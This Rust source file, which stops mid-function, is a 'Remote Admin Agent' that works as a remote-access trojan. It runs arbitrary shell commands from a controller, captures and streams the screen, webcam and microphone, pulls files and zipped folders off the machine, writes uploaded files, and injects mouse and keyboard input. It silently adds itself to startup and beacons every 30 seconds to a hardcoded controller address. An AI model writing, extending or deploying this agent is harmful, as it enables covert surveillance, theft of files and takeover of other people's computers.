use anyhow::Result;
use base64::{Engine as _, engine::general_purpose};
use serde::{Deserialize, Serialize};
use std::process::Command as ProcessCommand;
use sysinfo::System;
use tokio::io::{AsyncWriteExt};
use tokio::net::TcpListener;
use tokio_tungstenite::{accept_async, tungstenite::Message};
use futures_util::{StreamExt, SinkExt};
use std::sync::atomic::{AtomicBool, Ordering};
use nokhwa::{Camera, pixel_format::RgbFormat, utils::{CameraIndex, RequestedFormat, RequestedFormatType}};
use image::{ImageBuffer, RgbImage};
use enigo::{Enigo, Mouse, Keyboard, Settings, Button, Key, Direction};
use chrono::Local;
use std::fs::OpenOptions;
use std::io::Write as StdWrite;
use zip::write::FileOptions;
use walkdir::WalkDir;
use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
use std::sync::{Arc, Mutex as StdMutex}; // Rename to avoid confusion


// Command enum - KEEP remote control variants (for remotedesktop to use)
#[derive(Debug, Serialize, Deserialize)]
enum Command {
    Execute { command: String },
    Screenshot,
    SystemInfo,
    ListProcesses,
    Ping,
    Shutdown,  // FIRST ONE - KEEP THIS
    FileList { path: String },
    TurnWebcam { duration_seconds: u64 },
    RecordVideo { duration_seconds: u64 },
    RecordAudio { duration_seconds: u64 },  // NEW
    RecordAV { duration_seconds: u64 },  // ADD THIS LINE
    StartAudioStream { port: u16 },         // NEW
    StopAudioStream,                        // NEW
    StartAVStream { port: u16 },           // NEW: Audio + Video combined stream
    StopAVStream,                          // NEW
    DownloadFile { path: String },
    UploadFile { path: String, data: String }, // NEW: path = destination, data = base64 encoded file
    StartLiveStream { port: u16 },
    StopLiveStream,
    StartScreenStream { port: u16 },
    StopScreenStream,
    // Remote control commands for remotedesktop:
    MoveMouse { x: i32, y: i32 },
    ClickMouse { button: String },
    TypeText { text: String },
    PressKey { key: String },
}

// Response struct for sending replies to the controller
#[derive(Debug, Serialize, Deserialize)]
struct Response {
    success: bool,
    message: String,
    data: Option<String>,
}

impl Response {
    fn success(message: impl Into<String>) -> Self {
        Self {
            success: true,
            message: message.into(),
            data: None,
        }
    }

    fn success_with_data(message: impl Into<String>, data: impl Into<String>) -> Self {
        Self {
            success: true,
            message: message.into(),
            data: Some(data.into()),
        }
    }

    fn error(message: impl Into<String>) -> Self {
        Self {
            success: false,
            message: message.into(),
            data: None,
        }
    }
}

// Global flags for stream status
static STREAM_ACTIVE: AtomicBool = AtomicBool::new(false);
static SCREEN_STREAM_ACTIVE: AtomicBool = AtomicBool::new(false);  // ADD THIS
static AUDIO_STREAM_ACTIVE: AtomicBool = AtomicBool::new(false);  // NEW
static AV_STREAM_ACTIVE: AtomicBool = AtomicBool::new(false);  // NEW

// Function to log actions to a file
fn log_action(action: &str) -> Result<()> {
    let log_entry = format!("[{}] {}\n", 
        Local::now().format("%Y-%m-%d %H:%M:%S"),
        action
    );
    
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("remote_control.log")?;
    
    file.write_all(log_entry.as_bytes())?;
    Ok(())
}

// Screen streaming handler for WebSocket connections
async fn handle_screen_stream(stream: tokio::net::TcpStream) {
    let ws_stream = match accept_async(stream).await {
        Ok(ws) => ws,
        Err(e) => {
            eprintln!("WebSocket handshake failed: {}", e);
            return;
        }
    };
    
    let (mut write, mut read) = ws_stream.split();
    
    if write.send(Message::Text("{\"status\": \"screen_streaming_started\"}".to_string())).await.is_err() {
        return;
    }
    
    let mut frame_count = 0u32;
    let frame_interval = tokio::time::Duration::from_millis(200); // 5 FPS for screen
    let mut interval = tokio::time::interval(frame_interval);
    
    loop {
        interval.tick().await;
        
        tokio::select! {
            result = read.next() => {
                match result {
                    Some(Ok(msg)) if msg.is_close() => break,
                    Some(Err(_)) | None => break,
                    _ => {}
                }
            }
            _ = tokio::time::sleep(tokio::time::Duration::from_millis(0)) => {}
        }
        
        // Capture screen
        if let Ok(screens) = screenshots::Screen::all() {
            if let Some(screen) = screens.first() {
                if let Ok(image) = screen.capture() {
                    if let Ok(buffer) = image.to_png() {
                        frame_count += 1;
                        let encoded = general_purpose::STANDARD.encode(&buffer);
                        
                        let frame_msg = serde_json::json!({
                            "type": "screen",
                            "frame_number": frame_count,
                            "data": encoded
                        });
                        
                        if write.send(Message::Text(frame_msg.to_string())).await.is_err() {
                            break;
                        }
                    }
                }
            }
        }
    }
}

// Start the screen stream server
async fn start_screen_stream_server(port: u16) -> Result<()> {
    let addr = format!("0.0.0.0:{}", port);
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    
    SCREEN_STREAM_ACTIVE.store(true, Ordering::Relaxed);
    
    while SCREEN_STREAM_ACTIVE.load(Ordering::Relaxed) {
        match tokio::time::timeout(tokio::time::Duration::from_secs(1), listener.accept()).await {
            Ok(Ok((stream, _addr))) => {
                handle_screen_stream(stream).await;
            }
            Ok(Err(e)) => eprintln!("Failed to accept connection: {}", e),
            Err(_) => continue,
        }
    }
    
    Ok(())
}

#[derive(Debug, Serialize, Deserialize)]
struct AgentInfo {
    r#type: String,
    ip: String,
    hostname: String,
    os: String,
    version: String,
}

async fn handle_command(command: Command) -> Response {
    match command {
        Command::Ping => Response::success("Pong! Agent is alive."),
        
        Command::Execute { command } => {
            println!("Executing command: {}", command);
            log_action(&format!("Execute command: {}", command)).ok();
            
            #[cfg(target_os = "windows")]
            let output = ProcessCommand::new("cmd")
                .args(["/C", &command])
                .output();
            
            #[cfg(not(target_os = "windows"))]
            let output = ProcessCommand::new("sh")
                .args(["-c", &command])
                .output();
            
            match output {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    let result = format!("STDOUT:\n{}\n\nSTDERR:\n{}", stdout, stderr);
                    Response::success_with_data("Command executed", result)
                }
                Err(e) => Response::error(format!("Failed to execute command: {}", e)),
            }
        }
        
        Command::Screenshot => {
            println!("Taking screenshot...");
            log_action("Screenshot captured").ok();
            match screenshots::Screen::all() {
                Ok(screens) => {
                    if let Some(screen) = screens.first() {
                        match screen.capture() {
                            Ok(image) => {
                                match image.to_png() {
                                    Ok(buffer) => {
                                        let encoded = general_purpose::STANDARD.encode(&buffer);
                                        Response::success_with_data("Screenshot captured", encoded)
                                    }
                                    Err(e) => Response::error(format!("Failed to encode PNG: {}", e))
                                }
                            }
                            Err(e) => Response::error(format!("Failed to capture screen: {}", e)),
                        }
                    } else {
                        Response::error("No screens available")
                    }
                }
                Err(e) => Response::error(format!("Failed to get screens: {}", e)),
            }
        }
        
        Command::SystemInfo => {
            println!("Gathering system information...");
            let mut sys = System::new_all();
            sys.refresh_all();
            
            let info = format!(
                "System: {}\nKernel: {}\nOS Version: {}\nHostname: {}\nCPUs: {}\nTotal Memory: {} MB\nUsed Memory: {} MB\nTotal Swap: {} MB",
                System::name().unwrap_or("Unknown".to_string()),
                System::kernel_version().unwrap_or("Unknown".to_string()),
                System::os_version().unwrap_or("Unknown".to_string()),
                System::host_name().unwrap_or("Unknown".to_string()),
                sys.cpus().len(),
                sys.total_memory() / 1024 / 1024,
                sys.used_memory() / 1024 / 1024,
                sys.total_swap() / 1024 / 1024
            );
            
            Response::success_with_data("System information", info)
        }
        
        Command::ListProcesses => {
            println!("Listing processes...");
            let mut sys = System::new_all();
            sys.refresh_all();
            
            let mut processes: Vec<String> = sys
                .processes()
                .iter()
                .map(|(pid, proc)| {
                    format!(
                        "PID: {} | Name: {} | CPU: {:.1}% | Memory: {} MB",
                        pid,
                        proc.name().to_string_lossy(),
                        proc.cpu_usage(),
                        proc.memory() / 1024 / 1024
                    )
                })
                .collect();
            
            processes.sort();
            let process_list = processes.join("\n");
            
            Response::success_with_data(
                format!("Found {} processes", processes.len()),
                process_list
            )
        }
        
        Command::FileList { path } => {
            println!("Listing files in: {}", path);
            
            match std::fs::read_dir(&path) {
                Ok(entries) => {
                    let mut files: Vec<String> = entries
                        .filter_map(|entry| {
                            entry.ok().and_then(|e| {
                                let metadata = e.metadata().ok()?;
                                let file_type = if metadata.is_dir() { "DIR " } else { "FILE" };
                                let size = metadata.len();
                                Some(format!(
                                    "{} | {:>12} bytes | {}",
                                    file_type,
                                    size,
                                    e.file_name().to_string_lossy()
                                ))
                            })
                        })
                        .collect();
                    
                    files.sort();
                    let file_list = if files.is_empty() {
                        "Directory is empty or no accessible files".to_string()
                    } else {
                        files.join("\n")
                    };
                    
                    Response::success_with_data(
                        format!("Found {} items in {}", files.len(), path),
                        file_list
                    )
                }
                Err(e) => Response::error(format!("Failed to read directory: {}", e)),
            }
        }
        
        Command::TurnWebcam { duration_seconds } => {
            println!("Attempting to capture from webcam after {} seconds...", duration_seconds);
            log_action(&format!("Webcam capture: {} seconds", duration_seconds)).ok();
            
            // Wait for the specified duration
            std::thread::sleep(std::time::Duration::from_secs(duration_seconds));
            
            // Try to access webcam
            let camera_index = CameraIndex::Index(0);
            let requested = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestFrameRate);
            
            match Camera::new(camera_index, requested) {
                Ok(mut camera) => {
                    println!("Webcam detected! Opening stream...");
                    
                    match camera.open_stream() {
                        Ok(_) => {
                            std::thread::sleep(std::time::Duration::from_millis(500));
                            
                            match camera.frame() {
                                Ok(frame) => {
                                    println!("Frame captured! Decoding...");
                                    
                                    match frame.decode_image::<RgbFormat>() {
                                        Ok(image_buffer) => {
                                            let mut png_buffer = Vec::new();
                                            let width = image_buffer.width();
                                            let height = image_buffer.height();
                                            
                                            match ImageBuffer::from_raw(width, height, image_buffer.into_raw()) {
                                                Some(img) => {
                                                    let rgb_img: RgbImage = img;
                                                    
                                                    match rgb_img.write_to(
                                                        &mut std::io::Cursor::new(&mut png_buffer),
                                                        image::ImageOutputFormat::Png
                                                    ) {
                                                        Ok(_) => {
                                                            let encoded = general_purpose::STANDARD.encode(&png_buffer);
                                                            Response::success_with_data(
                                                                format!("✓ Real webcam captured after {} seconds!", duration_seconds),
                                                                encoded
                                                            )
                                                        }
                                                        Err(e) => Response::error(format!("Failed to encode image: {}", e))
                                                    }
                                                }
                                                None => Response::error("Failed to create image buffer")
                                            }
                                        }
                                        Err(e) => Response::error(format!("Failed to decode frame: {}", e))
                                    }
                                }
                                Err(e) => Response::error(format!("Failed to capture frame: {}", e))
                            }
                        }
                        Err(e) => Response::error(format!("Failed to open camera stream: {}", e))
                    }
                }
                Err(e) => {
                    println!("Webcam not available: {}. Using screenshot as fallback.", e);
                    
                    match screenshots::Screen::all() {
                        Ok(screens) => {
                            if let Some(screen) = screens.first() {
                                match screen.capture() {
                                    Ok(image) => {
                                        match image.to_png() {
                                            Ok(buffer) => {
                                                let encoded = general_purpose::STANDARD.encode(&buffer);
                                                Response::success_with_data(
                                                    format!("⚠ Webcam unavailable - Screenshot captured instead after {} seconds", duration_seconds),
                                                    encoded
                                                )
                                            }
                                            Err(e) => Response::error(format!("Failed to encode PNG: {}", e))
                                        }
                                    }
                                    Err(e) => Response::error(format!("Failed to capture: {}", e)),
                                }
                            } else {
                                Response::error("No screens or webcam available")
                            }
                        }
                        Err(e) => Response::error(format!("Failed to access camera or screen: {}", e)),
                    }
                }
            }
        }
        
        Command::RecordVideo { duration_seconds } => {
            println!("Recording video from webcam for {} seconds...", duration_seconds);
            log_action(&format!("Video recording: {} seconds", duration_seconds)).ok();
            
            let camera_index = CameraIndex::Index(0);
            let requested = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestFrameRate);
            
            match Camera::new(camera_index, requested) {
                Ok(mut camera) => {
                    match camera.open_stream() {
                        Ok(_) => {
                            println!("Camera opened, starting video recording...");
                            
                            let mut frames = Vec::new();
                            let start_time = std::time::Instant::now();
                            let duration = std::time::Duration::from_secs(duration_seconds);
                            let mut frame_count = 0u32;
                            
                            // Record frames for the specified duration
                            while start_time.elapsed() < duration {
                                match camera.frame() {
                                    Ok(frame) => {
                                        match frame.decode_image::<RgbFormat>() {
                                            Ok(image_buffer) => {
                                                let width = image_buffer.width();
                                                let height = image_buffer.height();
                                                
                                                match ImageBuffer::from_raw(width, height, image_buffer.into_raw()) {
                                                    Some(img) => {
                                                        let rgb_img: RgbImage = img;
                                                        let mut jpg_buffer = Vec::new();
                                                        
                                                        match rgb_img.write_to(
                                                            &mut std::io::Cursor::new(&mut jpg_buffer),
                                                            image::ImageOutputFormat::Jpeg(85)
                                                        ) {
                                                            Ok(_) => {
                                                                frames.push(jpg_buffer);
                                                                frame_count += 1;
                                                                
                                                                if frame_count % 30 == 0 {
                                                                    println!("Recorded {} frames...", frame_count);
                                                                }
                                                            }
                                                            Err(e) => eprintln!("Failed to encode frame: {}", e)
                                                        }
                                                    }
                                                    None => eprintln!("Failed to create image buffer")
                                                }
                                            }
                                            Err(e) => eprintln!("Failed to decode frame: {}", e)
                                        }
                                    }
                                    Err(e) => eprintln!("Failed to capture frame: {}", e)
                                }
                                
                                // Small delay between frames (~30 FPS)
                                std::thread::sleep(std::time::Duration::from_millis(33));
                            }
                            
                            println!("Video recording complete! Total frames: {}", frame_count);
                            
                            // Package all frames as JSON array
                            let video_data = serde_json::json!({
                                "frame_count": frame_count,
                                "duration": duration_seconds,
                                "fps": frame_count as f64 / duration_seconds as f64,
                                "frames": frames.iter().map(|f| general_purpose::STANDARD.encode(f)).collect::<Vec<_>>()
                            });
                            
                            Response::success_with_data(
                                format!("✓ Video recorded: {} frames in {} seconds ({:.1} FPS)", 
                                    frame_count, duration_seconds, frame_count as f64 / duration_seconds as f64),
                                video_data.to_string()
                            )
                        }
                        Err(e) => Response::error(format!("Failed to open camera stream: {}", e))
                    }
                }
                Err(e) => {
                    Response::error(format!("Webcam not available: {}", e))
                }
            }
        }
        
        Command::DownloadFile { path } => {
            println!("Reading: {}", path);
            
            match std::fs::metadata(&path) {
                Ok(metadata) => {
                    if metadata.is_file() {
                        // Handle regular file
                        match std::fs::read(&path) {
                            Ok(file_data) => {
                                let encoded = general_purpose::STANDARD.encode(&file_data);
                                let file_size = file_data.len();
                                
                                let filename = std::path::Path::new(&path)
                                    .file_name()
                                    .and_then(|n| n.to_str())
                                    .unwrap_or("unknown");
                                
                                Response::success_with_data(
                                    format!("File '{}' downloaded ({} bytes)", filename, file_size),
                                    encoded
                                )
                            }
                            Err(e) => Response::error(format!("Failed to read file: {}", e))
                        }
                    } else if metadata.is_dir() {
                        // Handle directory - create zip file
                        println!("Zipping directory: {}", path);
                        
                        match create_zip_from_directory(&path) {
                            Ok(zip_data) => {
                                let encoded = general_purpose::STANDARD.encode(&zip_data);
                                let folder_name = std::path::Path::new(&path)
                                    .file_name()
                                    .and_then(|n| n.to_str())
                                    .unwrap_or("folder");
                                
                                println!("Zipped {} bytes", zip_data.len());
                                
                                Response::success_with_data(
                                    format!("Folder '{}' zipped and ready ({} bytes compressed)", folder_name, zip_data.len()),
                                    encoded
                                )
                            }
                            Err(e) => Response::error(format!("Failed to zip directory: {}", e))
                        }
                    } else {
                        Response::error(format!("Path '{}' is not a file or directory", path))
                    }
                }
                Err(e) => {
                    Response::error(format!("Failed to access path '{}': {}", path, e))
                }
            }
        }
        
        Command::UploadFile { path, data } => {
            println!("Uploading file to: {}", path);
            
            // Decode base64 data
            match general_purpose::STANDARD.decode(&data) {
                Ok(file_data) => {
                    // Check if directory exists, create if needed
                    if let Some(parent) = std::path::Path::new(&path).parent() {
                        if !parent.exists() {
                            match std::fs::create_dir_all(parent) {
                                Ok(_) => println!("Created directory: {}", parent.display()),
                                Err(e) => return Response::error(format!("Failed to create directory: {}", e))
                            }
                        }
                    }
                    
                    // Write file
                    match std::fs::write(&path, &file_data) {
                        Ok(_) => {
                            let filename = std::path::Path::new(&path)
                                .file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("unknown");
                            
                            println!("Successfully wrote {} bytes", file_data.len());
                            Response::success(format!(
                                "File '{}' uploaded successfully ({} bytes)",
                                filename, file_data.len()
                            ))
                        }
                        Err(e) => Response::error(format!("Failed to write file: {}", e))
                    }
                }
                Err(e) => Response::error(format!("Failed to decode file data: {}", e))
            }
        }
        
        Command::StartLiveStream { port } => {
            println!("Starting live stream server on port {}...", port);
            log_action(&format!("Webcam streaming started on port {}", port)).ok();
            
            if STREAM_ACTIVE.load(Ordering::Relaxed) {
                return Response::error("Stream is already active");
            }
            
            let port_clone = port;
            std::thread::spawn(move || {
                let rt = tokio::runtime::Runtime::new().unwrap();
                rt.block_on(async move {
                    if let Err(e) = start_websocket_server(port_clone).await {
                        eprintln!("Streaming server error: {}", e);
                    }
                });
            });
            
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            
            Response::success(format!(
                "Live stream started! Connect WebSocket client to port {}",
                port
            ))
        }

        Command::StopLiveStream => {
            println!("Stopping live stream...");
            log_action("Webcam streaming stopped").ok();
            
            if !STREAM_ACTIVE.load(Ordering::Relaxed) {
                return Response::error("No stream is currently active");
            }
            
            STREAM_ACTIVE.store(false, Ordering::Relaxed);
            
            Response::success("Live stream stopped")
        }
        
        // ADD these handlers:
        Command::StartScreenStream { port } => {
            println!("Starting screen stream server on port {}...", port);
            
            if SCREEN_STREAM_ACTIVE.load(Ordering::Relaxed) {
                return Response::error("Screen stream is already active");
            }
            
            let port_clone = port;
            std::thread::spawn(move || {
                let rt = tokio::runtime::Runtime::new().unwrap();
                rt.block_on(async move {
                    if let Err(e) = start_screen_stream_server(port_clone).await {
                        eprintln!("Screen streaming server error: {}", e);
                    }
                });
            });
            
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            
            Response::success(format!(
                "Screen monitoring started! Connect to port {}",
                port
            ))
        }

        Command::StopScreenStream => {
            println!("Stopping screen monitoring...");
            
            if !SCREEN_STREAM_ACTIVE.load(Ordering::Relaxed) {
                return Response::error("No screen stream is currently active");
            }
            
            SCREEN_STREAM_ACTIVE.store(false, Ordering::Relaxed);
            
            Response::success("Screen monitoring stopped")
        }
        
        // NEW: Record audio command
        Command::RecordAudio { duration_seconds } => {
            println!("Recording audio for {} seconds...", duration_seconds);
            
            match record_audio(duration_seconds) {
                Ok(audio_data) => {
                    let encoded = general_purpose::STANDARD.encode(&audio_data);
                    Response::success_with_data(
                        format!("Audio recorded ({} seconds, {} bytes)", duration_seconds, audio_data.len()),
                        encoded
                    )
                }
                Err(e) => Response::error(format!("Failed to record audio: {}", e))
            }
        }
        
        // NEW: Start audio streaming
        Command::StartAudioStream { port } => {
            println!("Starting audio stream on port {}...", port);
            
            if AUDIO_STREAM_ACTIVE.load(Ordering::Relaxed) {
                return Response::error("Audio stream is already active");
            }
            
            let port_clone = port;
            std::thread::spawn(move || {
                let rt = tokio::runtime::Runtime::new().unwrap();
                rt.block_on(async move {
                    if let Err(e) = start_audio_stream_server(port_clone).await {
                        eprintln!("Audio streaming error: {}", e);
                    }
                });
            });
            
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            
            Response::success(format!("Audio stream started on port {}", port))
        }
        
        // NEW: Stop audio streaming
        Command::StopAudioStream => {
            println!("Stopping audio stream...");
            
            if !AUDIO_STREAM_ACTIVE.load(Ordering::Relaxed) {
                return Response::error("No audio stream is active");
            }
            
            AUDIO_STREAM_ACTIVE.store(false, Ordering::Relaxed);
            Response::success("Audio stream stopped")
        }
        
        // NEW: Combined Audio+Video streaming
        Command::StartAVStream { port } => {
            println!("Starting audio+video stream on port {}...", port);
            
            if AV_STREAM_ACTIVE.load(Ordering::Relaxed) {
                return Response::error("AV stream is already active");
            }
            
            let port_clone = port;
            std::thread::spawn(move || {
                let rt = tokio::runtime::Runtime::new().unwrap();
                rt.block_on(async move {
                    if let Err(e) = start_av_stream_server(port_clone).await {
                        eprintln!("AV streaming error: {}", e);
                    }
                });
            });
            
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            
            Response::success(format!("Audio+Video stream started on port {}", port))
        }
        
        Command::StopAVStream => {
            if !AV_STREAM_ACTIVE.load(Ordering::Relaxed) {
                return Response::error("No AV stream is active");
            }
            
            AV_STREAM_ACTIVE.store(false, Ordering::Relaxed);
            Response::success("Audio+Video stream stopped")
        }
        
        // NEW: Record Audio+Video together
        Command::RecordAV { duration_seconds } => {
            println!("Recording audio+video for {} seconds...", duration_seconds);
            
            // This will record both simultaneously and return both encoded data
            match record_audio_video(duration_seconds).await {
                Ok((video_data, audio_data)) => {
                    let combined = serde_json::json!({
                        "video": video_data,
                        "audio": audio_data
                    });
                    
                    Response::success_with_data(
                        format!("Audio+Video recorded ({} seconds)", duration_seconds),
                        combined.to_string()
                    )
                }
                Err(e) => Response::error(format!("Failed to record AV: {}", e))
            }
        }
        
        // Remote control commands:
        Command::MoveMouse { x, y } => {
            let mut enigo = match Enigo::new(&Settings::default()) {
                Ok(e) => e,
                Err(e) => return Response::error(format!("Failed to initialize input: {}", e))
            };
            
            match enigo.move_mouse(x, y, enigo::Coordinate::Abs) {
                Ok(_) => Response::success(format!("Mouse moved to ({}, {})", x, y)),
                Err(e) => Response::error(format!("Failed to move mouse: {}", e))
            }
        }
        
        Command::ClickMouse { button } => {
            let mut enigo = match Enigo::new(&Settings::default()) {
                Ok(e) => e,
                Err(e) => return Response::error(format!("Failed to initialize input: {}", e))
            };
            
            let btn = match button.to_lowercase().as_str() {
                "left" => Button::Left,
                "right" => Button::Right,
                "middle" => Button::Middle,
                _ => return Response::error(format!("Invalid button: {}", button))
            };
            
            match enigo.button(btn, Direction::Click) {
                Ok(_) => Response::success(format!("Clicked: {}", button)),
                Err(e) => Response::error(format!("Failed to click: {}", e))
            }
        }
        
        Command::TypeText { text } => {
            let mut enigo = match Enigo::new(&Settings::default()) {
                Ok(e) => e,
                Err(e) => return Response::error(format!("Failed to initialize input: {}", e))
            };
            
            match enigo.text(&text) {
                Ok(_) => Response::success(format!("Typed {} characters", text.len())),
                Err(e) => Response::error(format!("Failed to type: {}", e))
            }
        }
        
        Command::PressKey { key } => {
            let mut enigo = match Enigo::new(&Settings::default()) {
                Ok(e) => e,
                Err(e) => return Response::error(format!("Failed to initialize input: {}", e))
            };
            
            let key_enum = match key.to_lowercase().as_str() {
                "enter" => Key::Return,
                "esc" => Key::Escape,
                "tab" => Key::Tab,
                "space" => Key::Space,
                "backspace" => Key::Backspace,
                "delete" => Key::Delete,
                "up" => Key::UpArrow,
                "down" => Key::DownArrow,
                "left" => Key::LeftArrow,
                "right" => Key::RightArrow,
                _ => return Response::error(format!("Unsupported key: {}", key))
            };
            
            match enigo.key(key_enum, Direction::Click) {
                Ok(_) => Response::success(format!("Pressed key: {}", key)),
                Err(e) => Response::error(format!("Failed to press key: {}", e))
            }
        }
        
        Command::Shutdown => {
            println!("Shutdown command received");
            log_action("Agent shutdown requested").ok();
            Response::success("Agent shutting down...")
        }
    }
}

// ADD handle_client function BEFORE the constants
async fn handle_client(
    socket: tokio::net::TcpStream,
    addr: std::net::SocketAddr,
) -> Result<bool> {
    println!("New connection from: {}", addr);
    
    let (reader, mut writer) = socket.into_split();
    let mut reader = tokio::io::BufReader::new(reader);
    
    // Send agent info
    let local_ip = get_local_ip().unwrap_or_else(|| "Unknown".to_string());
    let agent_info = AgentInfo {
        r#type: "agent_info".to_string(),
        ip: local_ip.clone(),
        hostname: System::host_name().unwrap_or("Unknown".to_string()),
        os: System::name().unwrap_or("Unknown".to_string()),
        version: "2.0".to_string(),
    };
    
    let info_msg = format!("{}\n", serde_json::to_string(&agent_info)?);
    writer.write_all(info_msg.as_bytes()).await?;
    writer.flush().await?;
    
    let mut line = String::new();
    
    loop {
        line.clear();
        
        use tokio::io::AsyncBufReadExt;
        let bytes_read = reader.read_line(&mut line).await?;
        
        if bytes_read == 0 {
            println!("Connection closed by controller: {}", addr);
            break;
        }
        
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        
        println!("Received: {}", trimmed);
        
        let command: Command = match serde_json::from_str(trimmed) {
            Ok(cmd) => cmd,
            Err(e) => {
                let error_response = Response::error(format!("Invalid command format: {}", e));
                if let Ok(response_json) = serde_json::to_string(&error_response) {
                    let _ = writer.write_all(response_json.as_bytes()).await;
                    let _ = writer.write_all(b"\n").await;
                }
                continue;
            }
        };
        
        let is_shutdown = matches!(command, Command::Shutdown);
        
        // Process command sequentially
        let response = handle_command(command).await;
        
        // Send response
        if let Ok(response_json) = serde_json::to_string(&response) {
            let _ = writer.write_all(response_json.as_bytes()).await;
            let _ = writer.write_all(b"\n").await;
            let _ = writer.flush().await;
        }
        
        if is_shutdown {
            println!("Shutting down agent...");
            return Ok(true);
        }
    }
    
    Ok(false)
}

const CONTROLLER_ADDRESS: &str = "192.168.12.137:9999";  // ← UPDATED to match your actual IP
const AUTO_ANNOUNCE: bool = true;
const RECONNECT_INTERVAL_SECS: u64 = 30; // Retry every 30 seconds

#[tokio::main]
async fn main() -> Result<()> {
    let bind_addr = "0.0.0.0:7878";
    
    println!("Remote Admin Agent v2.0");
    println!("Listening on: {}", bind_addr);
    
    // Try to add to startup (silent fail if no permissions)
    let _ = add_to_startup();
    
    // Start background task for periodic controller announcement
    if AUTO_ANNOUNCE && !CONTROLLER_ADDRESS.is_empty() {
        let controller_addr = CONTROLLER_ADDRESS.to_string();
        tokio::spawn(async move {
            loop {
                match announce_to_controller(&controller_addr).await {
                    Ok(_) => println!("✓ Announced to controller"),
                    Err(_) => {} // Silent fail, will retry
                }
                
                // Wait before retrying
                tokio::time::sleep(tokio::time::Duration::from_secs(RECONNECT_INTERVAL_SECS)).await;
            }
        });
    }
    
    println!("Agent running...\n");
    
    let listener = TcpListener::bind(bind_addr).await?;
    
    loop {
        match listener.accept().await {
            Ok((socket, addr)) => {
                tokio::spawn(async move {
                    match handle_client(socket, addr).await {
                        Ok(true) => {
                            log_action("Agent shutdown complete").ok();
                            std::process::exit(0);
                        }
                        Ok(false) => {}
                        Err(_) => {}
                    }
                });
            }
            Err(_) => {}
        }
    }
}

// Helper function to get local IP
fn get_local_ip() -> Option<String> {
    use std::net::UdpSocket;
    
    let socket = UdpSocket::bind("0.0.0.0:0").ok()?;
    socket.connect("8.8.8.8:80").ok()?;
    let addr = socket.local_addr().ok()?;
    Some(addr.ip().to_string())
}

// Helper function to initialize camera
fn init_camera() -> std::result::Result<Camera, String> {
    let camera_index = CameraIndex::Index(0);
    let requested = RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestFrameRate);
    
    let mut camera = Camera::new(camera_index, requested)
        .map_err(|e| format!("Failed to open camera: {}", e))?;
    
    camera.open_stream()
        .map_err(|e| format!("Failed to start camera stream: {}", e))?;
    
    Ok(camera)
}

async fn handle_websocket_stream(stream: tokio::net::TcpStream) {
    let ws_stream = match accept_async(stream).await {
        Ok(ws) => ws,
        Err(e) => {
            eprintln!("WebSocket handshake failed: {}", e);
            return;
        }
    };
    
    let (mut write, mut read) = ws_stream.split();
    
    let mut camera = match init_camera() {
        Ok(cam) => cam,
        Err(e) => {
            eprintln!("{}", e);
            let error_msg = format!("{{\"error\": \"{}\"}}", e);
            let _ = write.send(Message::Text(error_msg)).await;
            return;
        }
    };
    
    if write.send(Message::Text("{\"status\": \"streaming_started\"}".to_string())).await.is_err() {
        return;
    }
    
    let mut frame_count = 0u32;
    let frame_interval = tokio::time::Duration::from_millis(33);
    let mut interval = tokio::time::interval(frame_interval);
    
    loop {
        interval.tick().await;
        
        tokio::select! {
            result = read.next() => {
                match result {
                    Some(Ok(msg)) if msg.is_close() => break,
                    Some(Err(_)) | None => break,
                    _ => {}
                }
            }
            _ = tokio::time::sleep(tokio::time::Duration::from_millis(0)) => {}
        }
        
        if let Ok(frame) = camera.frame() {
            if let Ok(image_buffer) = frame.decode_image::<RgbFormat>() {
                let width = image_buffer.width();
                let height = image_buffer.height();
                
                if let Some(img) = ImageBuffer::from_raw(width, height, image_buffer.into_raw()) {
                    let rgb_img: RgbImage = img;
                    let mut jpg_buffer = Vec::new();
                    
                    if rgb_img.write_to(&mut std::io::Cursor::new(&mut jpg_buffer), image::ImageOutputFormat::Jpeg(75)).is_ok() {
                        frame_count += 1;
                        let encoded = general_purpose::STANDARD.encode(&jpg_buffer);
                        
                        let frame_msg = serde_json::json!({
                            "type": "frame",
                            "frame_number": frame_count,
                            "data": encoded
                        });
                        
                        if write.send(Message::Text(frame_msg.to_string())).await.is_err() {
                            break;
                        }
                    }
                }
            }
        }
    }
    
    println!("Stream ended. Frames: {}", frame_count);
}

async fn start_websocket_server(port: u16) -> Result<()> {
    let addr = format!("0.0.0.0:{}", port);
    let listener = tokio::net::TcpListener::bind(&addr).await?;
    
    STREAM_ACTIVE.store(true, Ordering::Relaxed);
    
    while STREAM_ACTIVE.load(Ordering::Relaxed) {
        match tokio::time::timeout(tokio::time::Duration::from_secs(1), listener.accept()).await {
            Ok(Ok((stream, _addr))) => {
                handle_websocket_stream(stream).await;
            }
            Ok(Err(e)) => eprintln!("Failed to accept connection: {}", e),
            Err(_) => continue,
        }
    }
    
    Ok(())
}

async fn announce_to_controller(controller_addr: &str) -> Result<()> {
    println!("Attempting to announce to controller at {}...", controller_addr);
    
    match tokio::net::TcpStream::connect(controller_addr).await {
        Ok(mut stream) => {
            let local_ip = get_local_ip().unwrap_or_else(|| "Unknown".to_string());
            
            let agent_info = AgentInfo {
                r#type: "agent_announcement".to_string(),
                ip: local_ip.clone(),
                hostname: System::host_name().unwrap_or("Unknown".to_string()),
                os: System::name().unwrap_or("Unknown".to_string()),
                version: "2.0".to_string(),
            };
            
            let announcement = format!("{}\n", serde_json::to_string(&agent_info)?);
            stream.write_all(announcement.as_bytes()).await?;
            stream.flush().await?;
            
            println!("✓ Successfully announced to controller!");
            
            // Close connection immediately after announcement
            drop(stream);
            
            Ok(())
        }
        Err(e) => {
            println!("⚠ Could not connect to controller: {}", e);
            Ok(())
        }
    }
}

// Add this helper function before handle_command:
fn create_zip_from_directory(dir_path: &str) -> std::io::Result<Vec<u8>> {
